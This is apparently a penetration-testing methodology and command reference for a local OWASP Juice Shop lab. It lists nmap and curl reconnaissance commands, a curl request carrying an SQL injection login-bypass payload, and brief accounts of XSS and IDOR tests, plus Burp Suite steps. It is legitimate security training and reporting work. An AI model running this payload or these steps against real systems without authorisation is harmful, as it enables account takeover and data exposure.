# VAPT Methodology and Command Reference

All commands were executed only against the local authorized Juice Shop target.

## Reconnaissance

```bash
nmap -sV -p 3000 127.0.0.1
whatweb http://127.0.0.1:3000
curl -s http://127.0.0.1:3000/robots.txt
curl -s http://127.0.0.1:3000/ftp
curl -s http://127.0.0.1:3000/ftp/acquisitions.md
curl -s http://127.0.0.1:3000/ftp/legal.md
```

## Error handling / information disclosure

```bash
curl -s http://127.0.0.1:3000/ftp/package.json.bak
```

## SQL injection / authentication bypass

```bash
curl -i -X POST http://127.0.0.1:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  --data '{"email":"\' OR 1=1--","password":"anything"}'
```

## Client-side XSS

The browser was used to open a crafted search URL and confirm JavaScript execution with a visible `xss` alert.

## IDOR / Broken Access Control

A dedicated customer account (ID 25) was created, authenticated, and then used to request `/api/Users/1`. The server returned the administrator record.

## Burp Suite

- Configure Firefox proxy: `127.0.0.1:8080`
- Add `http://127.0.0.1:3000` to scope
- Capture traffic
- Send representative requests to Repeater
- Run a scoped Crawl and Audit using the Balanced configuration
- Review and de-duplicate findings

## Reporting rule

Only findings that were demonstrated or independently supported by Burp evidence are included in the final report. IDOR is included because it was reproduced using a normal customer account and a different object ID.
